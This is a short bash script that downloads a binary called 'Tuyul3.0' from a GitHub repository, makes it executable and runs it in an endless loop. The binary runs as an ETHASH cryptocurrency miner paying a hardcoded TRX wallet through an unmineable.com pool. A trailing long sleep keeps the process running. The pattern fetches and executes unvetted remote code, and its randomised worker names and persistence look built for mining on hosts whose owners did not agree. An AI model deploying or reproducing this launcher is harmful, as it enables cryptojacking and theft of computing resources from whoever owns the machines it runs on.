#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TFCt7MbKSyWpFnzo493Jt4vNCqeA5iT1fe
WORKER=$(echo $(shuf -i 10-40 -n 1)-tawheed#y3rh-wllm)
wget https://github.com/thecoderop/new/raw/main/Tuyul3.0
chmod +x Tuyul3.0
while [ 1 ]; do
./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999
